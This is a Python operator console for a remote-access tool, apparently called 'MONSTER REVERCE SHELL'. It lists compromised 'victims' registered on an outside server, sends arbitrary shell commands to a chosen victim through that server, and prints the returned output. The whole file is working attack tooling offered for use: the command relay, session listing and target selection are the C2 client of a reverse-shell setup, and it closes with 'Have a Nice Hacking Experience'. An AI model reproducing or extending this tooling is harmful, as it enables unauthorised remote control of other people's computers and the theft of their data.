from colorama import Fore,Back,Style
from modules.earth import Earth
import requests
import readline #don't remove this 
import time
import json
import os

logo = '''
                    /===========================================*
                ----                                             ----
             ---|                                                   |---
            |               |    MONSTER REVERCE SHELL     |            |
             ---|                                                   |---
                ----                                            ----
                    *==========================================/
'''

class Victim:
    def __init__(self,Id,name,ip,os_name,created):
        self.id = Id
        self.name = name
        self.ip = ip
        self.os_name = os_name
        self.created = created

class Shell:
    def __init__(self):
        self.server = "https://meterpreter.pythonanywhere.com/"
        self.targets = []
        self.target_dir = "~"
        self.target = None 
        self.decoration = None
        self.timeout = 3
        self.default_target = None
        self.settings = self.load_settings()
        self.apply_settings()

    def help_menu(self):
        with open('help.txt','r')as f:
            print(f.read())

    def load_settings(self):
        with open("settings.json", "r") as f:
            return json.load(f)  
        
    def set_setting(self,changes):
        changes = changes.split('set',1)[1].strip()
        changes = changes.split('=')
        option,value = changes[0].strip(),changes[1].strip()
        if option not in self.settings.keys():
            print(f"Setting {Fore.YELLOW}{option}{Fore.WHITE} does not exist.")
            return
        self.settings[option] = value if not value.isdigit() else int(value)
        self.save_settings()
        self.apply_settings()
        print(f"Setting {Fore.GREEN}{option}{Fore.WHITE} changed to {Fore.YELLOW}{value}{Fore.WHITE}")

    def save_settings(self):
        with open("settings.json", "w") as f:
            json.dump(self.settings, f, indent=4)

    def log_settings(self):
        for i in self.settings.keys():
            print(f"{Fore.GREEN}{i}:{Fore.WHITE} {self.settings[i]}")

    def apply_settings(self):
        self.server = self.settings["server"]
        self.decoration = self.settings["style"]
        self.timeout = self.settings["timeout"]
        self.default_target = self.settings["default_target"]
        if self.default_target:
            self.target = Victim(1,self.default_target["name"], self.default_target["ip"],self.default_target["os_name"],self.default_target["created"])
        
    def show_sessions(self):
        res = requests.get(f'{self.server}/register/states')
        if res.ok:
            sessions = res.json()
            for i,session in enumerate(sessions):
               print(f" {Fore.MAGENTA}{i+1}{Fore.WHITE} | {Fore.GREEN}{session["target"]}{Fore.WHITE} | {Fore.RED}{session["state"]}{Fore.WHITE} | {Fore.CYAN}{session["created"]}{Style.RESET_ALL}")
        else:
            print('Error while checking the sessions')
    def make_command(self,prompt):
        data = {
            'target': self.target.name,
            'command': prompt
        }

        requests.post(f'{self.server}/register/commands', json=data)
        return self.get_response(prompt)


    def get_response(self,prompt):
        for _ in range(5):
            time.sleep(self.timeout)
            res = requests.get(f'{self.server}/register/log?target={self.target}&cmd={prompt}')
            if res.ok:
                res = res.json()
                if res:
                    requests.delete(f'{self.server}/register/log')
                    if prompt == "pwd":
                        self.target_dir = res[0]['log']
                    return res[0]['log']
                
            print( Fore.RED + f"[-].... NO response for {prompt} Retrying !!! .....[-]" + Style.RESET_ALL)
        return Fore.RED + "[-].... No response !!! .....[-]" + Style.RESET_ALL


    def main(self):
        while True:
            command = input(Fore.RED + "\n┌──("+Fore.BLUE+f"{self.target.name+"㉿"+self.target.os_name if self.target else 'Meterpreter'}"+Fore.RED+f")-[{self.target_dir}]\n└─"+Fore.BLUE+"$ " + Style.RESET_ALL)
            if command:
                if command in ["exit","quit","q"]:
                    exit()
                elif command.startswith('set ') and "=" in command:
                    self.set_setting(command)
                elif command in ["clear","cls"]:
                    os.system("clear")
                    print(Fore.GREEN + logo + Style.RESET_ALL)
                elif command == "sessions":
                    self.show_sessions()
                elif command == "settings":
                    self.log_settings()
                elif command == 'help':
                    self.help_menu()
                elif command == "target":
                    self.select_target()
                else:
                    print(self.make_command(command) if self.target else Fore.RED + "[-].... You should select target first .....[-]" + Style.RESET_ALL)
            else:
                print(Fore.RED + '[-] ..... You should enter a valid command ..... [-]' + Style.RESET_ALL)
    def select_target(self):
        targets = requests.get(f'{self.server}/register/victime').json()
        for i, target in enumerate(targets):
            self.targets.append(Victim(i, target['name'],target['ip'],target['os_name'],target['created']))
            print(f"{i+1} | {target['name']} ({target['ip']}) | {target['os_name']} | {target['created']}")
        try:
            choice = int(input("Select target: "))
        except:
            print("Invalid input!")
            self.select_target()
        
        if 0 < choice <= len(self.targets):
            self.target = self.targets[choice-1]
        else:
            print("Invalid selection!")
            self.select_target()

os.system("clear")
sh = Shell()

if sh.decoration == "true":
    Earth()
    print(logo + Style.RESET_ALL)

print(Back.LIGHTGREEN_EX + Fore.RED +"[-]..... Have a Nice Hacking Experience .....[-]"+Style.RESET_ALL+"\n")
sh.main()